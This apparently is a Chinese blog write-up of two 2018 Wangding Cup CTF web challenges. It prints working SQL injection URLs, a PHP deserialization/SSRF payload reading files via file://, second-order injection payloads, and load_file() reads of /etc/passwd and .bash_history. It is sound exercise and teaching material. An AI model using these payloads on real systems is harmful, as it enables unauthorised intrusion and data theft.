<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="信息安全研究方向，目前着力于Web安全与渗透测试，向往Open、Free、Share的黑客精神。同时也是一名业余ctfer。"><title>记2018年网鼎杯的两个Web | zjun's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = 'https://hm.baidu.com/hm.js?' + '2bd5b990e2605fea321851cd73e77f93';
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();
</script><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 5.3.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">记2018年网鼎杯的两个Web</h1><a id="logo" href="/.">zjun's blog</a><p class="description">潜心习安全</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/tags/"><i class="fa fa-tags"> 标签</i></a><a href="/timeline/"><i class="fa fa-history"> 时间线</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a target="_blank" rel="noopener" href="https://tools.zjun.info/"><i class="fa fa-cube"> Tools</i></a><a target="_blank" rel="noopener" href="https://github.com/z1un"><i class="fa fa-github"> Github</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">记2018年网鼎杯的两个Web</h1><div class="post-meta">2020-04-09<span> | </span><span class="category"><a href="/categories/CTF/">CTF</a></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fakebook"><span class="toc-number">1.</span> <span class="toc-text">Fakebook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Comment"><span class="toc-number">2.</span> <span class="toc-text">Comment</span></a></li></ol></div></div><div class="post-content"><p>今年的网鼎杯也快要来了，就想找上一届的ctf题目来看看，正好发现<a target="_blank" rel="noopener" href="https://buuoj.cn/">buuctf</a>上面有三个<code>web</code>(Fakebook，Comment，Unfinish)，但最后一题不知道是我姿势有问题还是环境问题，总之只复现了两个web。</p>
<a id="more"></a>

<h2 id="Fakebook"><a href="#Fakebook" class="headerlink" title="Fakebook"></a>Fakebook</h2><p><font color=red><strong>考点：</strong></font></p>
<ul>
<li>php代码审计</li>
<li>sql注入</li>
<li>php反序列化</li>
<li>ssrf</li>
</ul>
<p>存在有<code>robots</code>文件，访问之得到源码地址<code>/user.php.bak</code>，于是下载</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个<code>UserInfo</code>类，前面都是一些传参，主要的点在<code>get</code>方法中，其次<code>isValidBlog</code>方法对用户输入进行了过滤。</p>
<p>看<code>get</code>方法，先初始化<code>curl</code>会话，设置一个<code>url</code>链接，然后第二个<code>curl_setopt</code>里面是<code>1</code>，表示如果成功只将结果返回，不输出任何内容。如果失败返回<code>FALSE</code>，随即运行<code>curl</code>，并返回执行结果。<code>$httpCode</code>用来获取<code>http</code>状态码。</p>
<p>分析了定义的<code>get</code>方法后，我们再来简单了解下<code>curl</code>的用法及特性，而且后面注册输入博客<code>url</code>时是会加载的，综合这些信息，可容易得出由于对<code>curl</code>控制不严导致存在<code>ssrf</code>漏洞，<code>curl</code>支持多种协议：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp scp sftp smb smbs smtp smtps telnet tftp</span><br></pre></td></tr></table></figure>
<p>试想这里我们是不是可以利用<code>curl</code>支持的<code>file</code>协议来构造读取服务器内文件，但是由于<code>isValidBlog</code>方法的存在导致我们不能直接在注册处读取文件。</p>
<p>回到题目，先随意注册一个用户登录进去，可以选一些比如<code>baidu</code>之类的网址，会明显看到博客地址有被加载</p>
<p><img src="https://oss.zjun.info/zjun.info/18wdb-1.png" alt="18wdb-1"></p>
<p>注意<code>url</code>的格式，可能存在注入</p>
<p><code>/view.php?no=1</code></p>
<p>查字段数：<code>4</code></p>
<p><code>/view.php?no=1 order by 4</code></p>
<p>联合查询显示<code>no hack</code>，利用注释符轻松绕过</p>
<p><code>/view.php?no=-1 union/**/select 1,2,3,4#</code></p>
<p>查库名为：<code>fakebook</code></p>
<p><code>/view.php?no=-1 union/**/select 1,database(),3,4#</code></p>
<p>查表名为：<code>users</code></p>
<p><code>/view.php?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#39;fakebook&#39;#</code></p>
<p>查列名：<code>no</code>,<code>username</code>,<code>passwd</code>,<code>data</code></p>
<p><code>/view.php?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=&#39;fakebook&#39; and table_name=&#39;users&#39;#</code></p>
<p>查出其中所有数据：</p>
<p><code>/view.php?no=-1 union/**/select 1,group_concat(no,username,passwd,data),3,4 from fakebook.users#</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1zjundad271d633ebcf4f364ab8976fc5ea5035360d5420fc644a41cadc1b6098c98b901cf8c8609207dd774f2996c542115a20e36c9e06d0ec0f97dcedec30d59db6O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;zjun&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:21:&quot;https:&#x2F;&#x2F;www.zjun.info&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><code>data</code>列存储的数据是序列化的字符串，可以利用前面的<code>ssrf</code>配合<code>file</code>协议构造<code>paylod</code>读取<code>flag</code>文件</p>
<p>先构造<code>pop</code>链（其实不构造也行，直接把上面的<code>博客地址</code>改成<code>flag路径</code>，再改下<code>字符长度</code>传过去即可）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class UserInfo&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;new UserInfo();</span><br><span class="line">$a-&gt;name&#x3D;&quot;zjun&quot;;</span><br><span class="line">$a-&gt;blog&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><code>php</code>执行一下输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3：&#123;s:4:&quot;name&quot;;s:4:&quot;zjun&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>最终<code>payload</code>：</p>
<p><code>view.php?no=-1 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;zjun&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;#</code></p>
<p>查看源码得：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text&#x2F;html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s5NGQ4OTk2OS04NTQyLTQwZGEtYjdiZS1kODMzNmM3NWVjMWR9IjsNCmV4aXQoMCk7DQo&#x3D;</span><br></pre></td></tr></table></figure>
<p><code>base64</code>解码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s5NGQ4OTk2OS04NTQyLTQwZGEtYjdiZS1kODMzNmM3NWVjMWR9IjsNCmV4aXQoMCk7DQo&#x3D;&#39; | base64 -d</span><br></pre></td></tr></table></figure>
<p>得<code>flag</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag &#x3D; &quot;flag&#123;94d89969-8542-40da-b7be-d8336c75ec1d&#125;&quot;;</span><br><span class="line">exit(0);</span><br></pre></td></tr></table></figure>


<p>除此之外还存在一<font color=red>非预期</font>解法，由于有较高权限以及可用<code>load_file()</code>函数，所以可以直接构造<code>payload</code>：</p>
<p><code>/view.php?no=0 union/**/select 1,load_file(&#39;/var/www/html/flag.php&#39;),3,4#</code></p>
<p>然后查看源码直接可得<code>flag</code></p>
<h2 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h2><p><font color=red><strong>考点：</strong></font></p>
<ul>
<li>git用法</li>
<li>php代码审计</li>
<li>二次注入</li>
<li>linux bash杂点</li>
</ul>
<p>来看看题，一个留言板，发帖跳转登录</p>
<p><img src="https://oss.zjun.info/zjun.info/18wdb-2.png" alt="18wdb-2"></p>
<p>帐号给出了，密码简单爆破一下，得<code>zhangwei666</code>，然后又来到发帖页面</p>
<p><img src="https://oss.zjun.info/zjun.info/18wdb-3.png" alt="18wdb-3"></p>
<p>控制台发现<code>程序员GIT写一半跑路了,都没来得及Commit</code>字样，由<code>git</code>和<code>commit</code>判断可能存在<code>git</code>源码泄漏以及与<code>git</code>状态相关的东西，所以利用<a target="_blank" rel="noopener" href="https://github.com/WangYihang/GitHacker">GitHacker</a>工具，可连同<code>.git</code>目录一起下载下来。</p>
<p>查看<code>git</code>操作记录</p>
<p><code>git log --reflog</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">commit e5b2a2443c2b6d395d06960123142bc91123148c (refs&#x2F;stash)</span><br><span class="line">Merge: bfbdf21 5556e3a</span><br><span class="line">Author: root &lt;root@localhost.localdomain&gt;</span><br><span class="line">Date:   Sat Aug 11 22:51:17 2018 +0800</span><br><span class="line"></span><br><span class="line">    WIP on master: bfbdf21 add write_do.php</span><br><span class="line"></span><br><span class="line">commit 5556e3ad3f21a0cf5938e26985a04ce3aa73faaf</span><br><span class="line">Author: root &lt;root@localhost.localdomain&gt;</span><br><span class="line">Date:   Sat Aug 11 22:51:17 2018 +0800</span><br><span class="line"></span><br><span class="line">    index on master: bfbdf21 add write_do.php</span><br><span class="line"></span><br><span class="line">commit bfbdf218902476c5c6164beedd8d2fcf593ea23b (HEAD -&gt; master)</span><br><span class="line">Author: root &lt;root@localhost.localdomain&gt;</span><br><span class="line">Date:   Sat Aug 11 22:47:29 2018 +0800</span><br><span class="line"></span><br><span class="line">    add write_do.php</span><br></pre></td></tr></table></figure>
<p>把第一行版本源码恢复出来</p>
<p><code>git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</code></p>
<p>得到完整源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = mysql_num_rows(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = mysql_fetch_array(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>审计代码发现当<code>get</code>传入的<code>do=write</code>时，利用<code>addslashes()</code>函数对<code>post</code>传入的变量进行转义，在每个双引号<code>&quot;</code>前添加反斜杠</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$category &#x3D; addslashes($_POST[&#39;category&#39;]);</span><br><span class="line">$title &#x3D; addslashes($_POST[&#39;title&#39;]);</span><br><span class="line">$content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br></pre></td></tr></table></figure>
<p>而当<code>do=comment</code>时，直接传入未进行有效过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);</span><br></pre></td></tr></table></figure>
<p>源码中的<code>write</code>和<code>comment</code>分别对应<code>发帖</code>和<code>留言</code>界面，结合二者和题目靶机结构，可以构造代码完成二次注入的操作。</p>
<p>下面来看看具体如何实现，留言界面，构造<code>sql</code>语句，源码是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">        set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">            content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">            bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>构造如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">        set category = &#x27;&#x27;,content=user(),/*&#x27;,</span></span><br><span class="line"><span class="string">            content = &#x27;*/#&#x27;,</span></span><br><span class="line"><span class="string">            bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>发帖时，通过<code>addslashes()</code>函数转义存入数据库，再从数据库中查询放入<code>sql</code>语句，显示出来，这里没有进行转义，所以在留言时利用多行注释符<code>/**/</code>即可闭合<code>sql</code>语句，执行我们的查询内容。</p>
<p>来看看效果：</p>
<p><img src="https://oss.zjun.info/zjun.info/18wdb-4.png" alt="18wdb-4"></p>
<p>然后查看详情，留言处将其闭合：</p>
<p><img src="https://oss.zjun.info/zjun.info/18wdb-5.png" alt="18wdb-5"></p>
<p>点击提交，<code>sql</code>语句执行：</p>
<p><img src="https://oss.zjun.info/zjun.info/18wdb-6.png" alt="18wdb-6"></p>
<p>接下来我们可以利用<code>sql</code>语句查询或配合<code>load_file()</code>函数读取服务器文件，直到读取到<code>flag</code>即可</p>
<p>读<code>/etc/passwd</code> :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,content=load_file(&quot;/etc/passwd&quot;),/*</span></span><br></pre></td></tr></table></figure>
<p><img src="https://oss.zjun.info/zjun.info/18wdb-7.png" alt="18wdb-7"></p>
<p>最后一行可见<code>www</code>以<code>bash</code>身份运行，读<code>bash</code>历史操作<code>/home/www/.bash_history</code>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,content=load_file(&quot;/home/www/.bash_history&quot;),/*</span></span><br></pre></td></tr></table></figure>
<p><img src="https://oss.zjun.info/zjun.info/18wdb-8.png" alt="18wdb-8"></p>
<p>格式化一下操作如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/</span><br><span class="line">unzip html.zip</span><br><span class="line">rm -f html.zip</span><br><span class="line">cp -r html /var/www/</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">rm -f .DS_Store</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
<p>注意<code>/var/www/html</code>中的<code>.DS_Store</code>被删除了，但是<code>/tmp/html</code>下的该文件还存在，读之（外加一层<code>hex</code>编码，不然会显示不全）：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,content=hex(load_file(&quot;/tmp/html/.DS_Store&quot;)),/*</span></span><br></pre></td></tr></table></figure>
<p><img src="https://oss.zjun.info/zjun.info/18wdb-9.png" alt="18wdb-9"></p>
<p>字符很多，用<a target="_blank" rel="noopener" href="http://tools.hackxc.cc/bm/">小陈师傅的在线工具</a>解码一下，可发现不是很清晰的<code>flag_8946e1ff1ee3e40f.php</code>字样</p>
<p><img src="https://oss.zjun.info/zjun.info/18wdb-10.png" alt="18wdb-10"></p>
<p>又读之</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,content=hex(load_file(&quot;/tmp/html/flag_8946e1ff1ee3e40f.php&quot;)),/*</span></span><br></pre></td></tr></table></figure>
<p>解码后得假的<code>flag</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;f9ca1a6b-9d78-11e8-90a3-c4b301b7b99b&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>换个目录读，因为是复制过来的，<code>/var/www/html/</code>中也自然有这个<code>flag</code>文件，读之</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,content=hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;)),/*</span></span><br></pre></td></tr></table></figure>
<p>得真<code>flag</code></p>
